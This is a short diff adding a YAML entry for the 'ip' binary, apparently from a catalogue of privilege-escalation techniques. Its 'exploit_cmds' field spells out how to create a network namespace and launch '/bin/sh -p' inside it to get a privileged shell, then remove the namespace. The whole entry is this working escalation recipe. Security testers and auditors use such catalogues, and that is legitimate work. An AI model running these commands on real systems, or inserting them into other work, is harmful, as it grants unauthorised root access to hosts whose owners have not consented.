@@ -1,0 +1,8 @@
+name: ip
+binary_path: /usr/bin/ip
+exploit_cmds:
+- '/usr/bin/ip netns add foo
+
+  /usr/bin/ip netns exec foo /bin/sh -p
+
+  /usr/bin/ip netns delete foo'
